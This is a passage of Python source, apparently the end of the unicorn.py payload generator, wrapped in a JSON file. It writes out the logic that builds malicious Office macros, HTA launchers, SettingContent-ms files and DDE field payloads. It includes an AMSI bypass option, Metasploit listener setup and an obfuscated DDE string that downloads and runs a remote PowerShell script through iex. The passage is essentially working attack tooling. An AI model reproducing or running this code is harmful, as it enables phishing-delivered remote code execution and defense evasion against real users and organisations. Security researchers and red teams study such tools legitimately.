         # add HTA option for shellcode\n            if \"hta\" in sys.argv:\n                gen_hta_attack(full_attack)\n                print(\"[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!|n\")\n            if \"macro\" in sys.argv:\n                macro_gen = generate_macro(full_attack)\n                write_file(\"powershell_attack.txt\", macro_gen)\n                print(\"[*] Exported the custom shellcode to the macro generation and exported to powershell_attack.txt. Enjoy!\\n\")\n            else:\n                write_file(\"powershell_attack.txt\", full_attack)\n                custom_shellcode()\n                print(\"[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\\n\")\n\n    if attack_type == \"msf\" or attack_type == \"download/exec\":\n        if attack_modifier == \"macro\":\n            macro_attack = generate_macro(full_attack)\n            write_file(\"powershell_attack.txt\", macro_attack)\n            macro_help()\n\n        elif attack_modifier == \"hta\":\n            gen_hta_attack(full_attack)\n            # move unicorn to hta attack if hta specified\n            shutil.move(\"unicorn.rc\", \"hta_attack/\")\n            hta_help()\n\n        elif attack_modifier == \"ms\":\n            ms_voodoo_stuff()\n            gen_hta_attack(full_attack)\n            custom_shellcode()\n            shutil.move(\"Standalone_NoASR.SettingContent-ms\", \"hta_attack/\")\n            shutil.move(\"unicorn.rc\", \"hta_attack/\")\n            settings_ms()\n            print(\"[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.\")\n            print(\"[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta\")\n            print(\"[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.\")\n\n        else:  # write out powershell attacks\n\n            if len(full_attack) > 8191:\n                if AMSI_BYPASS.lower() == \"on\":\n                    print(\"[*] Note that AMSI_BYPASS is currently set to 'ON' which incorporates an AMSI Bypass technique that is large in nature.\")\n                    print(\"[*] Windows command prompt has a character restriction of 8191 which if you are using cmd.exe as a payload delivery option, this will not work.\")\n                    print(\"[*] Turn off AMSI_BYPASS=ON in the unicorn.py file located at the very top to turn this feature off which is ON by default.\")\n                    print(\"[*] If you are calling PowerShell directly, this is not a concern.\")\n                else:\n                    print(\"[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.\")\n                    print(\"[!] Total Payload Length Size: \" + str(len(full_attack)))\n                    input(\"Press {return} to continue.\")\n\n            # format for dde specific payload\n            if attack_modifier == \"dde\":\n                full_attack_download = full_attack[11:] # remove powershell + 1 space\n                # incorporated technique here -> http://staaldraad.github.io/2017/10/23/msword-field-codes/\n                full_attack = ('''DDE \"C:\\\\\\\\Programs\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\MSWord\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\windows\\\\\\\\system32\\\\\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\\\\\v1.0\\\\\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # \" \"Microsoft Document Security Add-On\"''' % (ipaddr)) # quote = WindowsPowerShell, powershell.exe, and iex\n                with open (\"download.ps1\", \"w\") as fh: fh.write(full_attack_download)\n\n            write_file(\"powershell_attack.txt\", full_attack)\n            if attack_modifier != \"dde\":\n                if AMSI_BYPASS.lower() == \"on\": amsi_help() # print the AMSI bypass language\n                ps_help() # present normal powershell attack instructions\n\n            # if we are using dde attack, present that method\n            if attack_modifier == \"dde\":\n                dde_help()\n\n    elif attack_type == \"custom_ps1\":\n        if attack_modifier == \"macro\":\n            macro_attack = generate_macro(full_attack, option)\n            write_file(\"powershell_attack.txt\", macro_attack)\n        else:\n            write_file(\"powershell_attack.txt\", full_attack)\n\n        custom_ps1_help()\n\n    else:\n        if attack_type != \"cs\":\n            if attack_type != \"shellcode\":\n                if attack_modifier != \"hta\":\n                    if attack_modifier != \"macro\":\n                       write_file(\"powershell_attack.txt\", full_attack)\n                       ps_help()\n\n    # Print completion messages\n    if attack_type == \"msf\" and attack_modifier == \"hta\":\n        print(\"[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.\")\n        print(\"[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\\n\")\n\n    elif attack_type == \"msf\" or attack_type ==\"download/exec\":\n        print(\"[*] Exported powershell output code to powershell_attack.txt.\")\n        if attack_type != \"download/exec\":\n            print(\"[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\")\n\n        if attack_type == \"download/exec\":\n            print(\"[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.\")\n\n        if attack_modifier == \"dde\":\n            print(\"[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)\")\n        print(\"\\n\")\n\n    elif attack_type == \"custom_ps1\":\n        print(\"[*] Exported powershell output code to powershell_attack.txt\")\n\n\n# This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\ndef ms_voodoo_stuff():\n    # read file content in\n    ms_input = open(\"templates/Standalone_NoASR.SettingContent-ms\", \"r\").read()\n    # write the content out\n    write_file(\"Standalone_NoASR.SettingContent-ms\", ms_input)\n    settings_ms()\n\n# pull the variables needed for usage\ntry:\n    attack_type = \"\"\n    attack_modifier = \"\"\n    payload = \"\"\n    ps1path = \"\"\n\n    if len(sys.argv) > 1:\n        os.system(\"clear\")\n        gen_unicorn()\n        payload_options = [\"powershell\",\"macro\",\"hta\",\"cert\",\"custom\",\"dde\",\"cobalt\",\"general\"]\n        help_options = [\"-h\",\"--help\"]\n\n        if len(sys.argv) > 2:\n            if sys.argv[2] in payload_options and sys.argv[1] in help_options:\n                # Show help for specific payload options\n                if sys.argv[2] == \"powershell\":\n                    ps_help()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"macro\" and re.search('\\.ps1$', sys.argv[1]) is None: # \"unicorn.py PATH.ps1 macro\" not working, there's a fix\n                    macro_help()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"hta\":\n                    hta_help()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"cert\":\n                    cert_help()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"custom\":\n                    custom_ps1_help()\n                    custom_shellcode()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"dde\":\n                    dde_help()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"cobalt\":\n                    cobalt_strike()\n                    gen_usage()\n                    sys.exit()\n                elif sys.argv[2] == \"general\":\n                    gen_usage()\n                    sys.exit()\n        elif len(sys.argv) <= 2 and sys.argv[1] in help_options:\n            # Show all help menus if none specified\n            ps_help()\n            macro_help()\n            hta_help()\n            cert_help()\n            custom_ps1_help()\n            dde_help()\n            cobalt_strike()\n            gen_usage()\n            sys.exit()\n\n        # if using a 64 bit payload then downgrade to 32 bit. The way unicorn works is by doing whats called an x86 downgrade attack so there is$\n        if (\"windows/x64/meterpreter\") in sys.argv[1]:\n            print(\"[!] WARNING: x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload.\")\n            sys.argv[1] = sys.argv[1].replace(\"windows/x64/\", \"windows/\")\n\n        # settings option for SettingContent-ms filetype attack vector\n        if sys.argv[1] == \"ms\":\n            attack_type = (\"ms\")\n\n        else:\n            if len(sys.argv) > 2 and sys.argv[2] == \"crt\":\n                attack_type = \"crt\"\n                payload = sys.argv[1]\n            elif re.search('\\.ps1$', sys.argv[1]) is not None:\n                attack_type = \"custom_ps1\"\n                ps1path = sys.argv[1]\n\n            elif sys.argv[1] ==\"windows/download_exec\":\n                attack_type = \"download/exec\"\n                port = \"none\"\n                if \"macro\" in sys.argv: attack_modifier = \"macro\"\n\n            elif sys.argv[2] == \"cs\":\n                attack_type = \"cs\"\n\n                # using hta attack within custom shellcode or cobalt strike\n                if \"hta\" in sys.argv: \n                    attack_modifier = \"hta\"\n\n                if \"ms\" in sys.argv:\n                    attack_modifier = \"ms\"\n\n                # using macro attack within custom shellcode or co balt strike\n                if \"macro\" in sys.argv:\n                    attack_modifier = \"macro\"\n\n            elif sys.argv[2] == \"shellcode\":\n                attack_type = \"shellcode\"\n\n            else:\n                attack_type = \"msf\"\n                payload = sys.argv[1]\n\n    # if we are using macros\n    if len(sys.argv) == 5:\n        if attack_type == \"msf\":  # msf macro attack\n            ipaddr = sys.argv[2]\n            port = sys.argv[3]\n            attack_modifier = sys.argv[4]\n            ps = gen_shellcode_attack(payload, ipaddr, port)\n\n        else:\n            print(\"[!] Options not understood or missing. Use --help switch for assistance.\")\n            sys.exit(1)\n\n        format_payload(ps, attack_type, attack_modifier, None)\n\n    # this is our cobalt strike and custom shellcode menu\n    elif attack_type == \"cs\" or attack_type == \"shellcode\": \n        if not os.path.isfile(sys.argv[1]): \n            print(\"[!] File not found. Check the path and try again.\")\n            sys.exit()\n        payload = open(sys.argv[1], \"r\").read()\n\n        if not \",\" in payload:\n\n            # attempt to see if its metasploit\n            payload = format_metasploit(payload)\n\n        if attack_type == \"cs\":\n            #if not \"char buf[] =\" in payload:\n            if not \"byte[] buf = new byte\" in payload:\n                if not \" byte buf[]\" in payload:\n                    print(\"[!] Cobalt Strike file either not formatted properly or not the C#/CS format.\")\n                    sys.exit()\n\n            payload = payload.split(\"{\")[1].replace(\" };\", \"\").replace(\" \", \"\") # stripping out so we have 0x00 format\n\n        ipaddr = \"cobaltstrike\"\n        port = \"cobaltstrike\"\n        ps = gen_shellcode_attack(payload, ipaddr, port)\n        if attack_modifier != \"hta\":\n            if attack_modifier != \"macro\":\n                if attack_modifier != \"ms\":\n                    attack_modifier = (\"cs\")\n\n        format_payload(ps, attack_type, attack_modifier, None)\n\n    # default unicorn & custom ps1 macro attacks\n    elif len(sys.argv) == 4 or attack_type == \"download/exec\":\n        if attack_type == \"custom_ps1\":  # custom ps1 macro attack\n            attack_modifier = sys.argv[2]\n            option = sys.argv[3]\n            ps = gen_ps1_attack(ps1path)\n        elif attack_type == \"msf\" or attack_type == \"download/exec\":\n            payload = sys.argv[1]\n            if attack_type != \"download/exec\":\n                port = sys.argv[3]\n            ipaddr = sys.argv[2]\n            if attack_modifier != \"macro\":\n                attack_modifier = \"\"\n            option = None\n            ps = gen_shellcode_attack(payload, ipaddr, port)\n\n        # It should not be possible to get here, but just in case it does for some reason in the future, it will\n        # prevent usage of 'ps' and 'option', causing the app to crash\n        else:\n            print(\"[!] Something went way wrong while generating payload.\")\n            sys.exit()\n\n        format_payload(ps, attack_type, attack_modifier, option)\n\n    elif len(sys.argv) == 3:\n        # Matthews base64 cert attack or cs\n        if attack_type == \"crt\":\n            cert_help()\n            # generate the attack vector\n            gen_cert_attack(payload)\n        elif attack_type == \"custom_ps1\":\n            attack_modifier = sys.argv[2]\n            ps = gen_ps1_attack(ps1path)\n            format_payload(ps, attack_type, attack_modifier, None)\n\n        else:\n            print(\"[!] Options not understood or missing. Use --help switch for assistance.\")\n            sys.exit()\n\n    elif len(sys.argv) == 2:\n        if attack_type == \"custom_ps1\":\n            ps = gen_ps1_attack(ps1path)\n            format_payload(ps, attack_type, None, None)\n\n        # here we start the magic voodoo stuff for SettingContent-ms\n        elif attack_type == \"ms\":\n            ms_voodoo_stuff()\n\n        else:\n            print(\"[!] Options not understood or missing. Use --help switch for assistance.\")\n            sys.exit()\n\n    # if we did supply parameters\n    elif len(sys.argv) < 2:\n        gen_unicorn()\n        gen_usage()\n\nexcept KeyboardInterrupt:\n    print(\"\\nExiting Unicorn... May the magical unicorn force flow through you.\\n\")\n    sys.exit()\n\nexcept Exception as e:\n    if \"list index\" in str(e): print(\"[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.\")\n    else: print(\"[!] Something went wrong, printing the error: \" + str(e))\n"
        }
      ]
    }
  ]
}